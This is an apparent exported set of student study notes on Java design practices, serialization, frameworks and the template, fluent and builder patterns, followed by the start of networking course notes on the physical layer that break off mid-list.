 handleRemaining(i-&gt;first.mayAdd(i,Kind.Meat,500));
 if (first.grams &gt;= 500){ return; }
 handleRemaining(i-&gt;first.mayAdd(i,Kind.Vegetables,600));
 }
 void side(){
 handleRemaining(i-&gt;second.mayAdd(i,Kind.Vegetables,500));
 }</code></pre></details></li></ul><h3 id="1251a926-7344-80e6-b51b-ea00745eec8e" class="">Returning Tuples</h3><p id="1251a926-7344-8078-ad30-c625dd96959a" class="">don’t return multiple results as a tuple, make a class that stores those results and return an instance of that class </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8011-8ba0-f89a861667ad" class="code"><code class="language-Java">//Given a String count how many digits and how many spaces
//in a single pass
final class StringInfo{
 int digits= 0;
 int spaces= 0;
 StringInfo(String s){
 s.chars().forEach(c-&gt;{
 if(Character.isDigit(c)){digits += 1;}
 if(Character.isWhitespace(c)){spaces += 1;}
 });
 }
}
//Sometimes we think we need a method that returns more than one result
//We are wrong, we just need a class with fields.
//Idiomatic way/Pattern: the Info class!
//Make a constructor instead of a method.</code></pre><h3 id="1251a926-7344-8083-8904-e49f77b32634" class="">Prints</h3><p id="1251a926-7344-8051-be43-f844b93cbb52" class="">don’t print results and check the condition with your eyes</p><p id="1251a926-7344-80ce-a22b-f6b1bedaba13" class="">just write code that checks the condition for you: asserts</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-80fd-9c1c-cabf3c930988" class="code"><code class="language-Java">//hmm let me see if foo has the correct values!!11!
System.out.println(foo.toString());

//let the computer check the condition and tell you if it works or not
assert foo.toString().equals(&quot;Foo[3,5]&quot;):
	&quot;breakHere&quot;;</code></pre><h3 id="1251a926-7344-8028-8095-f882990e58be" class="">Manual Accumulation</h3><p id="1251a926-7344-80be-8ebc-f773367cecc9" class="">don’t just use variables and fors to manually check and find</p><ul id="1251a926-7344-80bd-90ad-e2218b8c55f8" class="bulleted-list"><li style="list-style-type:disc">most basic stuff learnt in first year, not the best solution but its all you know how to do</li></ul><p id="1251a926-7344-8011-bb19-f01c7834504c" class="">use methods and streams, they’re shorter to write and easier to read</p><ul id="1251a926-7344-80bd-a09a-f2e801d8182d" class="bulleted-list"><li style="list-style-type:disc">actually a good solution, requires more knowledge but its not better because its harder, its better because its actually the way you should do it </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-80ce-a2c4-fe6e16cd23f7" class="code"><code class="language-Java">//using a for and boolean
record Person(String name, int age){}
		...
		List&lt;Person&gt;ps= ...;
		...
		//bad way
		boolean found= false;
		for (Person p : ps){
				if (p.name().equals(&quot;Bob&quot;) &amp;&amp; p.age() &gt; 30){
				found = true;
				break;
		}
}

//just use streams
 boolean found2= ps.stream()
	 .anyMatch(p-&gt;p.name().equals(&quot;Bob&quot;) &amp;&amp; p.age() &gt; 30); //better

//make a method  that does the check
//even better way
boolean test(Person p) { return p.name().equals(&quot;Bob&quot;) &amp;&amp; p.age() &gt; 30; }
//fantastic for assertions!
 assert ps.stream().anyMatch(p-&gt;test(p)):
	 &quot;BreakPointHere!&quot;;
	 //variants: .allMatch, .noneMatch</code></pre><h3 id="1251a926-7344-80d1-9f7f-d49f7cebeebe" class="">Mis-Abstraction</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8087-ad26-ec778570b761" class="code"><code class="language-Java">if(condition()) {/*..*/} //ok
if(condition() == true) {/*..*/} //NO!
return condition();//ok
if (condition()){ return true; } else { return false; } //NO!
myName.equals(&quot;Bob&quot;) //ok
myname == &quot;Bob&quot; //NO!
is = is.stream()
.map(i-&gt;i * 2).toList();//ok
is = is.stream()
.filter(i-&gt;i &gt; 0).map(i-&gt;i * 2).toList();//also ok
is = is.stream()
.filter(i-&gt;i &gt; 0).toList()
.stream().map(i-&gt;i * 2).toList();//NO!
Function&lt;Integer,Integer&gt; f= i-&gt;i * 2;
is = is.stream().map(f).toList();//ok, lambdas are just objects</code></pre></details></li></ul><ul id="1231a926-7344-8080-94c6-e002c6a85a57" class="toggle"><li><details><summary><mark class="highlight-default">Fuzz Testing</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-804a-9854-fc5501909bb0"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="1291a926-7344-80fe-8099-fe1ef2145b02" class="bulleted-list"><li style="list-style-type:disc">manual testing: checks behavior with eyes</li></ul><ul id="1291a926-7344-80e1-b789-e9272f21e294" class="bulleted-list"><li style="list-style-type:disc">automatic testing: single case test, check output is expected </li></ul><p id="8cd4be1a-6673-4344-ade6-9365a50ffd75" class="">fuzz testing: <mark class="highlight-yellow">property based testing</mark> on <mark class="highlight-yellow">automatically generated data </mark></p><ul id="1291a926-7344-80e4-aefc-e18167cfc494" class="bulleted-list"><li style="list-style-type:disc">same checks on large amount of inputs</li></ul><ul id="1291a926-7344-808b-8a07-d84616ff0f3f" class="bulleted-list"><li style="list-style-type:disc">quadratic gain in testing</li></ul></div></figure></details></li></ul><ul id="1231a926-7344-808d-a0db-ccd0adbf8aa7" class="toggle"><li><details><summary><mark class="highlight-default">Serialization </mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-80d4-a20f-d81091f45aa6"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="8736504d-6991-45ad-b101-7fab5baa3e42" class="">process of converting objects to and from sequence of bits</p><ul id="1291a926-7344-80fd-8b63-c5f09446ffc3" class="bulleted-list"><li style="list-style-type:disc">allows objects to be saved, loaded, transfused reused from disk or network</li></ul><ul id="1291a926-7344-8079-91b6-c7a6c28483bf" class="bulleted-list"><li style="list-style-type:disc">object graph needs to be serialized: all objects contained inside a serializable object also needs to be serializable</li></ul></div></figure><h3 id="1291a926-7344-80ce-af55-cfa279320931" class="">Easy<mark class="highlight-default"> Case (String → Bits)</mark></h3><ul id="1291a926-7344-80cc-8d3d-ee1b1a4da532" class="bulleted-list"><li style="list-style-type:disc">converting string to and from bits is easy: most languages have a way to encode strings as byte arrays (int encoded as symbols)<figure id="1291a926-7344-8085-990c-f93b0be3d523" class="image"><a href="image%2018.png"><img style="width:567.984375px" src="image%2018.png"/></a></figure></li></ul><ul id="1291a926-7344-80c1-9b9c-f2ed2d1da0d5" class="bulleted-list"><li style="list-style-type:disc">iconic solution to serialize complex data is to piggy-back of strings by representing objects as strings: JSON &amp; XML do this<figure id="1291a926-7344-801b-9a4f-f6d7010ed9f8" class="image"><a href="fbac6bae-9cf7-4307-8f16-7c8a41eed27c.png"><img style="width:708px" src="fbac6bae-9cf7-4307-8f16-7c8a41eed27c.png"/></a></figure></li></ul><h3 id="1291a926-7344-8026-bcf6-ea377fbce24c" class="">Serializable Interface</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-80c2-b904-ffd4df314747" class="code"><code class="language-Java">//methods
public byte[] serialize(Object o)throws IOException{
	 var aux= new ByteArrayOutputStream();
	 try(var out= new ObjectOutputStream(aux)){
			 out.writeObject(o);
			 out.flush();
	 }
	 return aux.toByteArray();
}

public Object deserialize(byte[] data)throws IOException, ClassNotFoundException{
	 try(var i= new ObjectInputStream(new ByteArrayInputStream(data))){
			 return i.readObject();
	 }
}

//easy
record Person(String name, int age) implements Serializable{}

//just need id
class Person implements Serializable{
	 private static final long serialVersionUID = 1L;
}

//the interface type of lambdas needs to extend serializable
interface MyFunction&lt;T,R&gt; extends Function&lt;T,R&gt;, Serializable{}
MyFunction&lt;Integer,Person&gt; solution1 = age -&gt; new Person(&quot;Bob&quot;, age);
//or cast the lambda with
Function&lt;Integer,Person&gt; solution2 = (Function&lt;Integer,Person&gt; &amp; Serializable) (age) -&gt; new Person(&quot;Bob&quot;,age);

//pray needs to be serializable to work
record Cat(Object prey) implements Serializable{}</code></pre><ul id="1291a926-7344-8063-8060-c9039f6a2939" class="bulleted-list"><li style="list-style-type:disc">serializable creates objects with reflections and fields are filled up (even final ones)</li></ul><ul id="1291a926-7344-8032-af73-f6e56e08b37c" class="bulleted-list"><li style="list-style-type:disc">records are created by calling the constructor<ul id="1291a926-7344-802c-be09-ddd1d69f1dcd" class="bulleted-list"><li style="list-style-type:circle">asserts/ifs will run</li></ul><ul id="1291a926-7344-8079-b4e7-ed2514bc680c" class="bulleted-list"><li style="list-style-type:circle">records will get nulls if variables don’t exist in the bytes</li></ul></li></ul><ul id="1291a926-7344-800b-8021-f29b46cdfd68" class="bulleted-list"><li style="list-style-type:disc">lambdas can be serializable, bytes will save<ol type="1" id="1291a926-7344-807a-994f-ee6e5907ffbd" class="numbered-list" start="1"><li>name of functional interface of the lambda</li></ol><ol type="1" id="1291a926-7344-80a5-933a-ebc1f9362240" class="numbered-list" start="2"><li>location of code where lambda is defined</li></ol><ol type="1" id="1291a926-7344-8082-bcde-f7055f889b20" class="numbered-list" start="3"><li>captured variables </li></ol><ul id="1291a926-7344-806e-8d90-feece2e89e96" class="bulleted-list"><li style="list-style-type:circle">byte code of lambda WILL NOT BE SAVED</li></ul><ul id="1291a926-7344-8008-aa04-c6d1a869efea" class="bulleted-list"><li style="list-style-type:circle">non captured local variables will not be saved either</li></ul></li></ul><h3 id="1291a926-7344-8004-9203-cce26104ceb9" class="">Recursive Object Graphs</h3><figure id="1291a926-7344-8063-923e-f9469c89e2b0" class="image"><a href="image%2019.png"><img style="width:652px" src="image%2019.png"/></a></figure><figure id="1291a926-7344-8074-8aec-fedb496bcc6a" class="image"><a href="image%2020.png"><img style="width:652px" src="image%2020.png"/></a></figure><figure id="1291a926-7344-804e-92fc-c4c64c29af96" class="image"><a href="image%2021.png"><img style="width:652px" src="image%2021.png"/></a></figure><figure id="1291a926-7344-8010-8819-e9a71d324ca6" class="image"><a href="image%2022.png"><img style="width:652px" src="image%2022.png"/></a></figure><p id="1291a926-7344-80ff-a27d-f450037581d8" class="">
</p></details></li></ul><ul id="1231a926-7344-80ba-887e-d8e68b9e4ce5" class="toggle"><li><details><summary><mark class="highlight-default">Frameworks</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-80c2-a287-d59744f215f9"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="d65b5cc7-aa95-4ff6-89eb-3345a1cdc224" class="">preexisting framework code controls/calls user written code</p><ul id="1291a926-7344-805a-b27b-eb1b324a1dfa" class="bulleted-list"><li style="list-style-type:disc">in OO, related to dynamic dispatch &amp; time travel </li></ul><ul id="1291a926-7344-807f-b79b-fcc95388046c" class="bulleted-list"><li style="list-style-type:disc">frameworks are NOT only about webpages, programs, libraries, large<ul id="1291a926-7344-80ff-a228-dae1b81e7588" class="bulleted-list"><li style="list-style-type:circle">swing, java collections, streams are frameworks</li></ul><ul id="1291a926-7344-8067-8b18-d2c7d439375d" class="bulleted-list"><li style="list-style-type:circle">utils.Math, string class, primitive types are not</li></ul></li></ul><ul id="1291a926-7344-8049-9f7e-c287140d3d61" class="bulleted-list"><li style="list-style-type:disc">2 types: frameworks can be programs and or libraries<figure id="1291a926-7344-8076-b019-dcc709c5179c" class="image"><a href="image%2023.png"><img style="width:561.953125px" src="image%2023.png"/></a><figcaption>library allows user to define main, program already has a main</figcaption></figure><p id="1291a926-7344-8088-a7a4-cb20b85dd53e" class="">
</p></li></ul></div></figure><h3 id="1291a926-7344-802b-a29c-fdd61f02a7c4" class="">Smallest Framework</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8023-a0e3-e06856a1287d" class="code"><code class="language-Java">class A{ //framework
		int inner(){return 0;}
		int outer(){return this.inner()+1;} //tweak
}
class B extends A{
		int inner(){return 1;} //user code
}
public static void main(String args){
		new A().outer(); //main calls framework
}</code></pre><figure id="1291a926-7344-80f7-8e87-e5c7972bacf9" class="image"><a href="e7d1d425-d7e5-4568-a179-bcdb739b6950.png"><img style="width:368.5161290322581px" src="e7d1d425-d7e5-4568-a179-bcdb739b6950.png"/></a><figcaption>- main method will create A and call a.outer<br/>- framework (A) will decide when and how to call code of B, then tweak the result before returning it to the caller<br/>- user (B) code defined in B.inner is called by the framework<br/></figcaption></figure><h3 id="1291a926-7344-80a7-8a5a-f56a7ef725d3" class="">Basic Framework</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8005-b937-d381c9e8a6fa" class="code"><code class="language-Java">List&lt;Object&gt; o = List.of(new Point(3,4), new Point(5,6));
assert o.contains(new Point(3,4));</code></pre><figure id="1291a926-7344-801f-b193-c019af1a87df" class="image"><a href="b4d7aa8b-de86-4318-b390-a3462977cc88.png"><img style="width:708px" src="b4d7aa8b-de86-4318-b390-a3462977cc88.png"/></a></figure></details></li></ul><ul id="1231a926-7344-80dc-92df-d81293c8a153" class="toggle"><li><details><summary><mark class="highlight-default">Template Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-802e-a059-e1576368ea49"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="30269898-04e1-4415-9222-9c03488aec4b" class="">method that defines behavior</p><ul id="1291a926-7344-80c0-8f5f-e7c3f0dd7b3e" class="bulleted-list"><li style="list-style-type:disc">basically just dynamic dispatch</li></ul><ul id="1291a926-7344-807c-947e-eb28a6ca6c71" class="bulleted-list"><li style="list-style-type:disc">similar to the strategy pattern: instead of an object that defines behavior, the concrete instance will implement the method instead</li></ul><figure id="1291a926-7344-80de-b465-e01b8d393d64" class="image"><a href="ec8754ef-2158-45c0-aaba-7a1696b5f21d.png"><img style="width:708px" src="ec8754ef-2158-45c0-aaba-7a1696b5f21d.png"/></a></figure><figure id="1291a926-7344-80b8-b2ec-d17a49c45ecd" class="image"><a href="7b8d0dce-ecb3-4292-ab39-05f6763e295a.png"><img style="width:528px" src="7b8d0dce-ecb3-4292-ab39-05f6763e295a.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8049-a8b4-eaba12cafaa7" class="code"><code class="language-Java">//strategy
interface GraspingPolicy{
		void nextAction(RoboticArmStrategy robot, SensoryInput i);
}
class RoboticArmStrategy{
		GraspingPolicy policy;
		RoboticArmStrategy(GraspingPolicy policy){
				this.policy= policy;
		}
		boolean done(){ /*...*/ }
		SensoryInput lookAround(){ /*...*/ }
		final void doStuff(){
						while(!done()){
						var i= lookAround();
						policy.nextAction(this,i);
				}
		}
}
new RoboticArmStrategy((ras,i)-&gt;{/*...*/}) //strat can use lambda

//template
abstract class RoboticArmTemplate { 
		boolean done(){ /*...*/ } 
		SensoryInput lookAround(){ /*...*/ }
		abstract void nextAction(SensoryInput i); //template method
		final void doStuff(){
				while(!done()){
						var i= lookAround();
						this.nextAction(i);
				}
		}
}

new RoboticArmTemplate(){
	void nextAction(SensoryInput i){ //define the behavior
			/*...*/
	}
}</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-8045-8ebf-caaa3ff54cb8" class="toggle"><li><details><summary><mark class="highlight-default">Fluent Interface Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-80da-8a73-ea6419163c07"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="25191541-6c2f-45fe-819c-cf3bebfa9c01" class="">calling methods one after another in the same statement</p><ul id="1291a926-7344-80c6-8f01-f5cd3112134d" class="bulleted-list"><li style="list-style-type:disc">expression based programming: 1 statement : many expressions</li></ul><ul id="1291a926-7344-804a-982b-e2ef5bea6e25" class="bulleted-list"><li style="list-style-type:disc">each method returns a different type: methods after have different a different available methods since receiver type changed</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8039-8e75-ca26191d8b7e" class="code"><code class="language-Java">//streams are a fluent pattern!
//this is all statement with many expressions
String w = list.stream()
		.map(s-&gt;s.length())    //between calls type may change
		.filter(i-&gt;i&gt;3)        //have different available methods
		.max(Integer::compare) //since receiver type changed
		.map(i-&gt;i.toString())
		.orElse(nope);</code></pre><figure id="1291a926-7344-80e7-b8b1-c8e39668880d" class="image"><a href="image%2024.png"><img style="width:534px" src="image%2024.png"/></a></figure></div></figure></details></li></ul><ul id="1231a926-7344-8089-9366-eae18cadf5d6" class="toggle"><li><details><summary><mark class="highlight-default">Builder Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-8034-961b-c6690b0788ae"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="aab0bc99-d3a9-4132-8625-5b913fab43d5" class="">way to construct an object using a product builder object, calling methods to mutate the builder to keep track of instruction and outputting a product</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8007-b6f4-fd0646d3f54c" class="code"><code class="language-Java">record Person(String name, int age, String address){}
class PersonBuilder{
		private String namel
 public PersonBuilder name(String name){
 this.name = name; return this;
 }
 private int age;
 public PersonBuilder age(int age){
 this.age = age; return this;
 }
 private String address;
 public PersonBuilder address(String address){
 this.address = address; return this;
 }
 private List&lt;Cat&gt; cats= new ArrayList&lt;&gt;();
 public PersonBuilder withCat(Cat cat){
 this.cats.add(cat); return this;
 }
Person build(){ return new Person( name, age, address, List.copyOf(cats) ); }
}</code></pre></div></figure><ul id="1291a926-7344-8048-b09e-f10500ac7958" class="bulleted-list"><li style="list-style-type:disc">Problem<ul id="c131a2e5-7bd2-4cdf-90a1-73dcdcd1ddac" class="bulleted-list"><li style="list-style-type:circle">we want to make a product object</li></ul><ul id="45fccb9c-10bb-4fbb-9e74-3ca0d25403db" class="bulleted-list"><li style="list-style-type:circle">object is complicated and requires a lot of content</li></ul><ul id="0eb14ca8-70aa-413b-8769-272ef908fcde" class="bulleted-list"><li style="list-style-type:circle">can have constraints and conditonals </li></ul></li></ul><ul id="1291a926-7344-80c2-91d5-e14b9d8ce885" class="bulleted-list"><li style="list-style-type:disc">solution<ul id="782a0f65-09c5-45c0-82ab-d79558828be6" class="bulleted-list"><li style="list-style-type:circle">user code doesn’t create the product directly</li></ul><ul id="f0b6ed04-c39f-468a-b134-195421d12b37" class="bulleted-list"><li style="list-style-type:circle">instead creates the product using a product builder</li></ul><ul id="de9d9f68-e824-4654-8ccb-fdfc0477a25c" class="bulleted-list"><li style="list-style-type:circle">product builder is an object with methods “buildPart_” </li></ul><ul id="8df5a149-c9c4-47a7-ab77-ab93707031e9" class="bulleted-list"><li style="list-style-type:circle">builder is a mutable object to keep track of instructions about how to create the product</li></ul><ul id="d31ce73c-eebf-4cee-a679-4cfd455464b7" class="bulleted-list"><li style="list-style-type:circle">in modern programming, builder is implemented with a Fluent interface <ul id="065be93b-4344-4493-89db-81b6045b8dd1" class="bulleted-list"><li style="list-style-type:square">methods “buildPart_” are named with short names to avoid prefixes</li></ul><ul id="6d894dbb-0129-4351-9de0-930c3db57c28" class="bulleted-list"><li style="list-style-type:square">example: .buildPartName() = .name()</li></ul></li></ul><ul id="999476e3-b6c0-4a00-809e-1adf7257a26c" class="bulleted-list"><li style="list-style-type:circle">when product contains collections, builder allows to fill up collections with individual elements rather than providing the whole collection itself</li></ul></li></ul></details></li></ul><p id="1231a926-7344-8008-b23f-ce8b7ebcb592" class="">
</p></details></li></ul></details></li></ul></details></li></ul><ul id="1171a926-7344-8030-8229-ca9ffbfb5162" class="toggle"><li><details><summary>NWEN243</summary><figure id="11c1a926-7344-80e3-880b-f0622e4f46dd"><a href="https://ecs.wgtn.ac.nz/Courses/NWEN243_2024T2/PastExams" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://ecs.wgtn.ac.nz/Courses/NWEN243_2024T2/PastExams</div></div></a></figure><ul id="1171a926-7344-80f5-aebf-c2a63b1b1a36" class="toggle"><li><details><summary>overview</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="11e1a926-7344-8060-918c-d3600cdc60e6"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e3e5d22f-3733-49c0-9140-057b0bb6e8bf" class="">both part 1 and 2 examined</p><p id="11e1a926-7344-8074-b82c-ef2ca4019764" class="">mix of multi choice and short answer questions for both</p><p id="11e1a926-7344-801a-bb76-e3d0a4fd0f08" class="">bring a calculator</p></div></figure><figure id="1211a926-7344-806a-8217-f10a17e98e0a" class="image"><a href="image%2025.png"><img style="width:652.04541015625px" src="image%2025.png"/></a></figure><figure id="1211a926-7344-804d-8fbd-ec7f28c61849" class="image"><a href="image%2026.png"><img style="width:652.04541015625px" src="image%2026.png"/></a></figure><ul id="1171a926-7344-805f-aca2-e700ee8fb8f3" class="bulleted-list"><li style="list-style-type:disc">physical layer<ul id="11e1a926-7344-8060-a98f-f31dd792e6e6" class="bulleted-list"><li style="list-style-type:circle">intro<ul id="11e1a926-7344-8018-b886-e971026d456b" class="bulleted-list"><li style="list-style-type:square">players are: network operator, network equipment venders and app/services providers</li></ul><ul id="11e1a926-7344-80b1-8bda-d092e0efe006" class="bulleted-list"><li style="list-style-type:square">network are nodes connected via links</li></ul></li></ul><ul id="11e1a926-7344-8041-8042-c7432c6549e0" class="bulleted-list"><li style="list-style-type:circle">representing data as bits<ul id="11e1a926-7344-8027-8381-ee942ae08d39" class="bulleted-list"><li style="list-style-type:square">data/information is transfused as bits to represent any kind of data</li></ul><ul id="11e1a926-7344-8098-842a-fb498cd91e60" class="bulleted-list"><li style="list-style-type:square">numbers → bits = base 2</li></ul><ul id="11e1a926-7344-805a-b4bc-f747039bdc6f" class="bulleted-list"><li style="list-style-type:square">text → bits = encoding ints to symbols using tables such as ascii</li></ul><ul id="11e1a926-7344-803d-a7e5-f79135588285" class="bulleted-list"><li style="list-style-type:square">image → bits = 2d array of rbg values</li></ul><ul id="11e1a926-7344-807c-8893-e014c0b087ec" class="bulleted-list"><li style="list-style-type:square">audio → binary = sampling/quantizing waves of audio </li></ul></li></ul><ul id="11e1a926-7344-80c8-9750-c597facd62e7" class="bulleted-list"><li style="list-style-type:circle">Transmitting Bits<ul id="11e1a926-7344-8072-a08f-cb8154720cb1" class="bulleted-list"><li style="list-style-type:square">physical layer transmits bit streams over a physical medium (the communication channel)<ul id="11e1a926-7344-80f6-b090-d1d10bef985c" class="bulleted-list"><li style="list-style-type:disc">convert bits into signals suitable for the transmission medium</li></ul><ul id="11e1a926-7344-80c4-b3c2-ed47ce83735f" class="bulleted-list"><li style="list-style-type:disc">synchronization (two things being on the same time)</li></ul><ul id="11e1a926-7344-80e7-be07-dd1cda4e3032" class="bulleted-list"><li style="list-style-type:disc">handling error detection and correction</li></ul></li></ul></li></ul><ul id="11e1a926-7344-80f0-92b4-c5fc84f29d07" class="bulleted-list"><li style="list-style-type:circle">Modulation<ul id="11e1a926-7344-8088-a162-c8b8e51de747" class="bulleted-list"><li style="list-style-type:square">process of converting bits into signal suitable for transfer over the physical medium</li></ul><ul id="11e1a926-7344-80c8-b2e0-fd2d7b2b634b" class="bulleted-list"><li style="list-style-type:square">analog to digital</li></ul></li></ul><ul id="11e1a926-7344-805c-901d-c33b452ad2e8" class="bulleted-list"><li style="list-style-type:circle">Bandwidth<ul id="11e1a926-7344-80b2-920b-d294c5512f75" class="bulleted-list"><li style="list-style-type:square">max rate of information transfer over a chancel (bps)</li></ul><ul id="11e1a926-7344-80a1-8958-ef7085454a26" class="bulleted-list"><li style="list-style-type:square">signal degradation (Throughput Limitation)</li></ul><ul id="11e1a926-7344-8017-967c-f54e817e9c0a" class="bulleted-list"><li 